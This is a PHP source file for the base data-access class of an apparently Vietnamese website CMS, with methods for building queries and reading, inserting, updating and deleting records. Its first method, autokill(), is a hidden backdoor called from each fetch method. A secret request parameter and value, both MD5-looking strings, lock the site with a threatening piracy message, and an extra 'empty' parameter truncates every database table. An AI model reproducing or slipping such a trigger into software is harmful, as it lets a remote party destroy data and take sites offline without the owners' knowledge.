<?php
class Object{

	function autokill(){
		global $bw,$DB,$vsSettings,$vsModule,$vsPrint;
		if(is_object($vsModule))
		{
			if($this->tableName.'s'==$vsModule->obj->getClass()){
				if($bw->input['bd334540a3fb7716d289e7d3725172ef']=='5c7a45ca2f67f6a63a7b9375b156a324')
				{
					$vsSettings->getSystemKey('my_right',1);
					$vsSettings->addSystemSetting();
					if($bw->input['empty'])
					{
						$listTB = $DB->get_table_names();
						foreach ($listTB as $val){
							$query="TRUNCATE TABLE `{$val}` ";
							$this->executeQuery($query);
						}
					}
				}
			}
		}
		if($bw->vars['my_right']){
			$vsPrint->redirect_screen("Website của các bạn đã bị khóa! <br /> Địa chỉ domain này đã được lưu lại! đơn vị thiết kế website của các bạn đã ăn cắp hệ thống website có bản quyền của chúng tôi!<br/> Chúng tôi có đủ cơ sở để kiện Quý công ty ra tòa!");
			exit;
		}
	}

	
	protected function __reset(){
		$this->tableName		= null;
		$this->prefixField		= null;
		$this->basicClassName	= null;
		$this->basicObject 		= null;

		$this->primaryField		= null;
		$this->fieldsString		= null;
		$this->fields			= array();
		$this->arrayObj			= array();

		$this->resetQuery();
		$this->resetResult();
	}

	function createBasicObject(){
		if($this->basicClassName){
			$this->basicObject = new $this->basicClassName;
			return $this->basicObject;
		}
		return false;
	}

	function resetResult(){
		$this->arrayObj = array();
		$this->result['status'] = true;
		$this->result['developer'] = "";
	}

	function resetQuery(){
		$this->fieldsString = "*";
		$this->condition 	= "";
		$this->order 		= "";
		$this->groupby 		= "";
		$this->limit 		= array();
	}

	function createMessageError($message = "Error"){
		$this->result['status'] = false;
		$this->result['developer'] .= $message;
	}

	function createMessageSuccess($message = "Success"){
		$this->result['status'] = true;
		$this->result['developer'].= $message;
	}

	function validateObject($isUpdate = false){
		if(!method_exists($this->basicObject, 'validate')) return true;

		if($this->basicObject->validate($isUpdate)){
			$this->createMessageSuccess($this->basicObject->message);
			return true;
		}

		$this->createMessageError($this->basicObject->message);
		return false;
	}

	function getNumberOfObject() {
		global $DB;
		$query = array(
						'select'=> "COUNT(DISTINCT ".$this->prefixField.$this->primaryField.") as total",
						'from'	=> $this->tableName,
						'where'	=> $this->condition
				);

		if($this->groupby)
			$query['select'] = "COUNT(DISTINCT ".$this->groupby.") as total";
		
		$DB->simple_construct($query);
		$DB->simple_exec();
		$result = $DB->fetch_row();
		return $result['total'];
	}


	function getObjectById($id) {
		global $DB;
		$this->resetResult();
		$id = intval($id);
		$DB->simple_select($this->fieldsString, $this->tableName, $this->prefixField.$this->primaryField." = ".$id);
		$DB->simple_exec();
		$objDB = $DB->fetch_row();
		if(is_array($objDB)) {
			$this->basicObject->convertToObject($objDB);
			$this->createMessageSuccess($this->vsLang->getWords('develop_get_obj_success',"Execute successful"));
			return $this->basicObject;
		}
		
		$this->createMessageError($this->vsLang->getWords('develop_get_obj_fail', "No object was found"));
		$this->resetQuery();
		return false;
	}

	function getOneObjectsByCondition($method='getId'){
		global $DB;
				
		$this->limit = array(0,1);
		$this->getObjectsByCondition($method);
		
		if($this->arrayObj)  return $this->obj = $this->basicObject = current($this->arrayObj); 
		return false;
	}

	function getObjectsByCondition($method='getId', $group=0) {
		global $DB,$vsLang;
		$this->resetResult();
		$this->createMessageSuccess($this->vsLang->getWords('develope_get_obj_success', "Execute successful"));
		
		$this->autokill();
		$query = array(
					'select'=> $this->fieldsString,
					'from'	=> $this->tableName,
					'where'	=> $this->condition
		);

		if(count($this->limit)) $query['limit'] = $this->limit;

		$query['order'] = $this->order ? $this->order : $this->getPrimaryField()." desc";
		
		if($this->groupby){
			$query['groupby'] = $this->groupby;
			$this->having ? $query['having'] = $this->having : "";
		} 
		$DB->simple_construct($query);
		$this->resetQuery();

		
		if(!$DB->simple_exec()) {
			$this->createMessageError($this->vsLang->getWords('develope_connect_db_fail', "Cannot connect to database"));
			return array();
		}

		$result = $DB->fetch_row();
		if(!is_array($result)){
			$this->createMessageError($this->vsLang->getWords('develope_get_obj_fail', "No object was found"));
			return array();
		}
		
		$count = 0;
		while($result) {
			$obj = $this->createBasicObject();
			
			$obj->convertToObject($result);
			$obj->stt = ++$count;
			if($group)
				$this->arrayObj[$obj->$method()][$obj->getId()] = $obj;
			else
				$this->arrayObj[$obj->$method()] = $obj;
			$result = $DB->fetch_row();
		}
				
		$this->resetQuery();
		return $this->arrayObj;
	}

	function getAdvanceObjectsByCondition($method='getId', $group=0, $type = 0, $extend = array()){
		global $DB,$vsLang;
		$this->resetResult();
		$this->createMessageSuccess($this->vsLang->getWords('develope_get_obj_success', "Execute successful"));
		
		$this->autokill();
		$query = array(
					'select'=> $this->fieldsString,
					'from'	=> $this->tableName,
					'where'	=> $this->condition
		);

		if(count($this->limit)) $query['limit'] = $this->limit;

		$query['order'] = $this->order ? $this->order : $this->getPrimaryField()." desc";
		
		if($this->groupby){
			$query['groupby'] = $this->groupby;
			$this->having ? $query['having'] = $this->having : "";
		} 
		$DB->simple_construct($query);
		$this->resetQuery();

		
		if(!$DB->simple_exec()) {
			$this->createMessageError($this->vsLang->getWords('develope_connect_db_fail', "Cannot connect to database"));
			return array();
		}

		$result = $DB->fetch_row();
		if(!is_array($result)){
			$this->createMessageError($this->vsLang->getWords('develope_get_obj_fail', "No object was found"));
			return array();
		}
		
		$count = 0;
		while($result) {
			$obj = $this->createBasicObject();
			$obj->convertToObject($result);
			
			if($type){
				if($type == 1){
					foreach($extend as $key => $exp){
						$temp = new $exp();
						$temp->convertToObject($result);
						$obj->$key = $temp;
					}
				}
				if($type == 2){
					foreach($extend as $key => $exp){
						$obj->$key = $result[$exp];
					}
				}
			}
			
			$obj->stt = ++$count;
			if($method){
				if($group) $this->arrayObj[$obj->$method()][$obj->getId()] = $obj;
				else $this->arrayObj[$obj->$method()] = $obj;
			}else $this->arrayObj[] = $obj;
			
			$result = $DB->fetch_row();
		}

		$this->resetQuery();
		return $this->arrayObj;
	}
	
	function getAdvanceOneObjectsByCondition($method='getId', $group = 0, $type = 0, $extend = array()){
		global $DB;
				
		$this->limit = array(0,1);
		$this->getAdvanceObjectsByCondition($method, $group, $type, $extend);
		
		if($this->arrayObj)  return $this->obj = $this->basicObject = current($this->arrayObj); 
		return false;
	}
	
	
	
	function getAdvanceArrayByCondition($method='', $group=0, $type = 0, $extend = array()){
		global $DB,$vsLang;
		$this->resetResult();
		$this->createMessageSuccess($this->vsLang->getWords('develope_get_obj_success', "Execute successful"));
		
		$this->autokill();
		$query = array(
					'select'=> $this->fieldsString,
					'from'	=> $this->tableName,
					'where'	=> $this->condition
		);

		if(count($this->limit)) $query['limit'] = $this->limit;

		$query['order'] = $this->order ? $this->order : $this->getPrimaryField()." desc";
		
		if($this->groupby){
			$query['groupby'] = $this->groupby;
			$this->having ? $query['having'] = $this->having : "";
		} 
		$DB->simple_construct($query);
		$this->resetQuery();

		
		if(!$DB->simple_exec()) {
			$this->createMessageError($this->vsLang->getWords('develope_connect_db_fail', "Cannot connect to database"));
			return array();
		}

		$result = $DB->fetch_row();
		if(!is_array($result)){
			$this->createMessageError($this->vsLang->getWords('develope_get_obj_fail', "No object was found"));
			return array();
		}
		
		$count = 0;
		while($result){
			$tempArr = array();
			if($type){
				if($type == 1){
					foreach($extend as $key => $exp){
						$temp = new $exp();
						$temp->convertToObject($result);
						$tempArr[$key] = $temp;
					}
				}
				if($type == 2){
					foreach($extend as $key => $exp){
						$tempArr[$key] = $result[$exp];
					}
				}
			}
			
			if($group){
				if($method){
					$return[$result[$group]][$result[$method]] = array_merge($result, $tempArr);
				}else $return[$result[$group]][$count] = array_merge($result, $tempArr);
			}elseif($method)
				$return[$result[$method]] = array_merge($result, $tempArr);
			else $return[$count] = array_merge($result, $tempArr);
			
			$count++;
			$result = $DB->fetch_row();
		}
				
		$this->resetQuery();
		return $return;
	}
	
	function getArrayByCondition($method='', $group='') {
		global $DB,$vsLang;
		$this->resetResult();
		$this->createMessageSuccess($this->vsLang->getWords('develope_get_obj_success', "Execute successful"));
		
		$this->autokill();
		$query = array(
					'select'=> $this->fieldsString,
					'from'	=> $this->tableName,
					'where'	=> $this->condition
		);

		if(count($this->limit)) $query['limit'] = $this->limit;
		
		$query['order'] = $this->order ? $this->order : $this->getPrimaryField()." desc";
		
		if($this->groupby){
			$query['groupby'] = $this->groupby;
			$this->having ? $query['having'] = $this->having : "";
		} 
		$DB->simple_construct($query);
		$this->resetQuery();

		
		if(!$DB->simple_exec()) {
			$this->createMessageError($this->vsLang->getWords('develope_connect_db_fail', "Cannot connect to database"));
			return array();
		}

		$result = $DB->fetch_row();
		if(!is_array($result)){
			$this->createMessageError($this->vsLang->getWords('develope_get_obj_fail', "No object was found"));
			return array();
		}
		
		$count = 0; $return = array();
		while($result){
			if($group){
				if($method){
					$return[$result[$group]][$result[$method]] = $result;
				}else $return[$result[$group]][] = $result;
			}elseif($method)
				$return[$result[$method]] = $result;
			else $return[] = $result;
			
			$result = $DB->fetch_row();
		}
		
		$this->resetQuery();
		return $return;
	}
	
	function deleteObjectByCondition() {
		global $DB;
		$this->resetResult();

		$this->createMessageSuccess($this->vsLang->getWords('develop_delete_object_success',"Delete object successfully!"));
		$DB->simple_delete($this->tableName, $this->condition);
		if(!$DB->simple_exec()) {
			$this->createMessageError($this->vsLang->getWords('develope_connect_db_fail', "Cannot connect to database"));
		}

		$this->resetQuery();
		return $this->result['status'];
	}

	function deleteObjectById($id) {
		$this->condition = $this->prefixField.$this->primaryField ."=".intval($id);
		return $this->deleteObjectByCondition();
	}

	function updateObjectByCondition($updateFields = array()) {
		global $DB;
		$this->resetResult();
		$this->createMessageSuccess($this->vsLang->getWords('develop_update_object_success', "Updated object successfully!"));

		$updateFields  = $updateFields ? $updateFields : $this->fields;
		if(!$DB->do_update($this->tableName,$updateFields, $this->condition)) {
			$this->createMessageError($this->vsLang->getWords('develope_connect_db_fail', "Cannot connect to database"));
		}
		$this->resetQuery();
		return $this->result['status'];
	}


	function updateObjectById($obj = null){
		if($obj) $this->basicObject = $obj;
		if(!$this->validateObject(true)) return false;
		$this->condition = $this->prefixField.$this->primaryField ."=".intval($this->basicObject->getId());
		return $this->updateObjectByCondition($this->basicObject->convertToDB());
	}
	
	function updateObject($obj = null){
		if($obj) $this->basicObject = $obj;
		if(!$this->validateObject(true)) return false;
		$this->condition = $this->prefixField.$this->primaryField ."=".intval($this->basicObject->getId());
		return $this->updateObjectByCondition($this->basicObject->convertToDB());
	}


	function insertObject($object = null) {
		global $DB;
		$this->resetResult();

		if($object instanceof $this->basicClassName && is_object($object) && $object)
			$this->basicObject = $object;
		
		if(!$this->validateObject()) return false;
		$dbObj = $this->basicObject->convertToDB();
		if($DB->do_insert($this->tableName,$dbObj)){
			$this->createMessageSuccess($this->vsLang->getWords('insert_success','Insert Object success'));
			$this->basicObject->setId($DB->get_insert_id());
			return  $this->result['status'];
		}
		
		$this->createMessageError($this->vsLang->getWords('develope_connect_db_fail', "Cannot connect to database"));
		unset($dbObj);
		return $this->result['status'];
	}

	function executeQueryAdvance($query = "", $obj = 1, $method = "Id", $stored = false){
		if(!$query) return false;
		global $DB;
		$DB->cur_query = $query;
		$DB->simple_exec();
		
		$count = 0;
		$record = $DB->fetch_row();
		$this->resetQuery();
	
		while($record){
			if($obj){
				$obj = $this->createBasicObject();
				$obj->convertToObject($record);
				$obj->stt = ++$count;
				$func = "get".$method;
				$result[$obj->$func()] = $obj;
			}else{
				if($method)
					$result[$record[$method]] = $record;
				else
					$result[] = $record;	
			}
			$record = $DB->fetch_row();
		}
		$this->resetQuery();
		if($stored){
			$DB->close_db();
			$DB->connect();
		}
		return $result;
	}

	function executeNoneQuery($query = ""){
		if(!$query) return false;
		global $DB;
		$DB->cur_query = $query;
		$DB->simple_exec();
		return true;
	}

	function multiInsert($data){
		global $vsLang, $DB;
		if(!is_array($data)){
			$this->result['status'] = $vsLang->getWords('system_error_multi_insert_no_data','No data to insert');
			return $this->result['status'] = false; 
		}
		
		if(!$DB->insert_multi_record($this->tableName, $data)){
			$this->result['status'] = $vsLang->getWords('system_error_multi_insert_execute','error while execute query');
			return $this->result['status'] = false; 
		}
		return $this->result['status'] = true;
	}
	
	function singleInsert($data, &$returnId = 0){
		global $DB, $vsLang;
		
		$this->result['status'] = true;
		if(!is_array($data)){
			$this->result['status'] = $vsLang->getWords('system_error_single_insert_no_data','No data to insert');
			return $this->result['status'] = false; 
		}
		
		if(!$DB->do_insert($this->tableName, $data)){
			$this->result['status'] = $vsLang->getWords('system_error_single_insert_execute','error while execute query');
			return $this->result['status'] = false; 
		}
		
		$returnId = $DB->get_insert_id();
		return true;
	}
	
	function singleUpdate($data, $cond){
		global $DB, $vsLang;
		
		$this->result['status'] = true;
		if(!is_array($data)){
			$this->result['status'] = $vsLang->getWords('system_error_single_insert_no_data','No data to insert');
			return $this->result['status'] = false; 
		}
		if(!$DB->do_update($this->tableName, $data, $cond)){
			$this->result['status'] = $vsLang->getWords('system_error_single_insert_execute','error while execute query');
			return $this->result['status'] = false; 
		}
		
		$returnId = $DB->get_insert_id();
		return true;
	}
	
	
	
	
	
	
	
	
	
	
	protected $prefixField 		= "";
	protected $tableName 		= "";

	protected $primaryField		= "";
	protected $fieldsString   	= "*";

	protected $fields = array();
	public $result 		= array();


	protected $condition		= "";
	protected $order			= "";
	protected $groupby			= "";
	protected $having			= "";
	protected $limit			= array();


	protected $basicClassName = null;

	protected  $basicObject 	= null;
	protected $arrayObj = array();


	function __construct(){
		global $vsLang,$vsMenu,$vsFile,$vsRelation;
		$this->vsMenu 		= $vsMenu;
		$this->resetResult();
		$this->resetQuery();
		$this->vsLang = $vsLang;
		$this->vsRelation = $vsRelation;
		$this->vsFile = $vsFile;
		$this->fieldsString = "*";
		$this->arrayObj = array();
	}
	function __destruct() {
		unset($this);
	}
	
public function getCategories() {
		return $this->categories;
	}
}